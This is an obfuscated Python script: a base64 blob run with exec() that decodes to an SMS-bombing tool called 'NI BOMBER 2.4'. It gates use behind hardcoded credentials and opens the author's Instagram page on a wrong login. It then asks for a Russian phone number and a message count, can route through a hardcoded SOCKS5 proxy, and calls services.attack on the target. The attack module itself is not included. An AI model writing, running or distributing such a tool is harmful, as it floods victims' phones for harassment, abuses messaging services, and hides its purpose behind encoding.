import marshal, base64
exec(base64.b64decode("CmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc2VydmljZXMKaW1wb3J0IG9zCkNvcnJlY3RVc2VybmFtZSA9ICJnMHNhaW4iCkNvcnJlY3RQYXNzd29yZCA9ICJDbDBuaW5nIgoKbG9vcCA9ICd0cnVlJwp3aGlsZSAobG9vcCA9PSAndHJ1ZScpOgogICAgdXNlcm5hbWUgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bI10gXHgxYlswOzM2bSBFbnRlciBVc2VybmFtZVx4MWJbMTs5Mm3inqQgIikKICAgIGlmICh1c2VybmFtZSA9PSBDb3JyZWN0VXNlcm5hbWUpOgogICAgCXBhc3N3b3JkID0gcmF3X2lucHV0KCJcMDMzWzE7OTZtWyNdIFx4MWJbMDszNm0gRW50ZXIgUGFzc3dvcmRceDFiWzE7OTJt4p6kICIpCiAgICAgICAgaWYgKHBhc3N3b3JkID09IENvcnJlY3RQYXNzd29yZCk6CiAgICAgICAgICAgIHByaW50ICJMb2dnZWQgaW4gc3VjY2Vzc2Z1bGx5IGFzICIgKyB1c2VybmFtZSAjZmItY2xvbmluZy1pZCBTRwogICAgICAgICAgICBsb29wID0gJ2ZhbHNlJwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50ICJXcm9uZyBwYXNzd29yZCEiCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9zaHViaGFtX2cwc2Fpbi8/aGw9ZW4nKQogICAgZWxzZToKICAgICAgICBwcmludCAiV3JvbmcgdXNlcm5hbWUhIgogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9zaHViaGFtX2cwc2Fpbi8/aGw9ZW4nKQojIGNvbG91cnMKZ3JlZW4gICAgID0gJ1wwMzNbOTJtJwpjeWFuICAgICAgPSAnXDAzM1s5NW0nCmJvbGQgICAgICA9ICdcMDMzWzFtJwp1bmRlcmxpbmUgPSAnXDAzM1s0bScKZW5kICAgICAgID0gJ1wwMzNbMG0nCnJlZCAgICAgICA9ICdcMDMzWzkxbScKCiMgaGVhZGVyCnByaW50KGYie2dyZWVufXtib2xkfVx0XHR7dW5kZXJsaW5lfVtOSSBCT01CRVIgMi40XXtlbmR9IikKCnByaW50KCkKcHJpbnQoZiJ7Ym9sZH1jb2RlZCBieXtlbmR9IiwgZW5kPSIiKQpwcmludChmIntncmVlbn17Ym9sZH0gPj4ge2VuZH0iLCBlbmQ9IiIpCnByaW50KGYie2N5YW59e2JvbGR9U2h1QmhhbWcwc2FpbntlbmR9IikKCnByaW50KGYie2JvbGR9dGVsZWdyYW17ZW5kfSIsIGVuZD0iIikKcHJpbnQoZiJ7Z3JlZW59e2JvbGR9ID4+IHtlbmR9IiwgZW5kPSIiKQpwcmludChmIntjeWFufXtib2xkfUBTaHVCaGFtX2cwc2FpbntlbmR9IikKcHJpbnQoKQoKIyBpbnB1dHMKcHJpbnQoJ2VudGVyIHRoZSBudW1iZXIgd2l0aG91dCBvciB3aXRoIHByZWZpeGVzICgrNykgKDgpXG5leGFtcGxlOiA5MDE4MDE3MDEwJykKaW5wdXRfbnVtYmVyID0gaW5wdXQoZ3JlZW4gKyBib2xkICsgIj4+ICIgKyBlbmQpCnByaW50KCdob3cgbWFueSBzbXMgdG8gc2VuZD8nKQpzbXMgPSBpbnQoaW5wdXQoZ3JlZW4gKyBib2xkICsgIj4+ICIgKyBlbmQpKQoKcHJpbnQoZiJ5b3UgbmVlZCBhe2N5YW59IHRvciB7ZW5kfXkvbj8gIikKaXNfdG9yID0gaW5wdXQoYm9sZCArIGdyZWVuICsgIj4+ICIgKyBlbmQpCgoKZGVmIHBhcnNlX251bWJlcihudW1iZXIpOgoJbXNnID0gZiJbKl1jaGVjayBudW1iZXIgLSB7Z3JlZW59e2JvbGR9T0t7ZW5kfSIKCWlmIGxlbihudW1iZXIpIGluICgxMCwgMTEsIDEyKToKCQlpZiBudW1iZXJbMF0gPT0gIjgiOgoJCQludW1iZXIgPSBudW1iZXJbMTpdCgkJCXByaW50KG1zZykKCQllbGlmIG51bWJlcls6Ml0gPT0gIis3IjoKCQkJbnVtYmVyID0gbnVtYmVyWzI6XQoJCQlwcmludChtc2cpCgkJZWxpZiBpbnQobGVuKG51bWJlcikpID09IDEwIGFuZCBudW1iZXJbMF0gPT0gOToKCQkJcHJpbnQobXNnKQoJZWxzZToKCQlwcmludChmIlsqXWNoZWNrIG51bWJlciAtIHtyZWR9e2JvbGR9ZmFpbGVkIG51bWJlciF7ZW5kfVxuVGhpcyBib21iZXIgaXMgaW50ZW5kZWQgb25seSBmb3IgUnVzc2lhIGFuZCBpZiB0aGUgbnVtYmVyIHlvdSBlbnRlcmVkIGJlbG9uZ3MgdG8gYW5vdGhlciBjb3VudHJ5IHRoZW4gYWxhcyB0aGlzIGJvbWJlciBpcyBub3Qgc3VpdGFibGUgZm9yIHlvdSEiKQoJCXF1aXQoKQoJcmV0dXJuIG51bWJlcgpudW1iZXIgPSBwYXJzZV9udW1iZXIoaW5wdXRfbnVtYmVyKQoKIyB0b3IKaWYgc3RyKGlzX3RvcikgPT0gInkiOgogICAgICAgIHByaW50KGYiWypdbGF1bmNoIHtjeWFufXtib2xkfVRvcntlbmR9Li4uIikKICAgICAgICBwcm94aWVzID0gewogICAgICAgICAgICAnaHR0cCc6ICdzb2NrczU6Ly8xMzkuNTkuNTMuMTA1OjEwODAnLAogICAgICAgICAgICAnaHR0cHMnOiAnc29ja3M1Oi8vMTM5LjU5LjUzLjEwNToxMDgwJwogICAgICAgIH0KICAgICAgICB0b3IgPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9pY2FuaGF6aXAuY29tLycsIHByb3hpZXM9cHJveGllcykudGV4dAogICAgICAgIHRvciA9ICh0b3IucmVwbGFjZSgnXG4nLCAnJykpCiAgICAgICAgcHJpbnQoZiJbKl1sYXVuY2gge2N5YW59e2JvbGR9VG9ye2VuZH0gLSB7Z3JlZW59e2JvbGR9T0t7ZW5kfSIpCgpzZXJ2aWNlcy5hdHRhY2sobnVtYmVyLCBzbXMpCg=="))
